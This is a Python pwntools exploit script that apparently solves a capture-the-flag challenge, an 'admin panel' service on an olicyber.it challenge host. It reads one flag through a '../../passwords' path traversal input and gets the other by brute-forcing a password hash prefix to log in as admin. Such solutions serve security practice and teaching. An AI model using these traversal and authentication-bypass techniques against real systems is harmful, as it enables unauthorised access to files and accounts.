import os

from hashlib import sha256
from pwn import *

exe = ELF("./admin_panel_patched")

context.binary = exe

HOST = "adminpanel.challs.olicyber.it"
PORT = 12200

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote(HOST, PORT)

    return r

def getpass():
    while True:
        rnd = os.urandom(8).hex().encode()
        h = sha256(rnd).hexdigest()
        if h[:6] == "bed100":
            return rnd
        
def flag1(r):
    r.sendlineafter(b"Esci\n", b"3")
    r.sendlineafter(b"leggere? ", b"../../passwords")

    r.recvuntil(b"flag1:")
    print("FLAG 1: ", bytes.fromhex(r.recvline().decode()).decode())

def flag2(r):
    r.sendlineafter(b"Esci\n", b"1")

    r.sendlineafter(b"Username: ", b"admin")
    r.sendlineafter(b"Password: ", getpass())

    r.sendlineafter(b"Esci\n", b"5")
    r.recvuntil(b"token: ")

    print("FLAG 2: ", r.recvline().decode())
    
def main():
    r = conn()

    flag1(r)
    flag2(r)
    
    r.close()

if __name__ == "__main__":
    main()
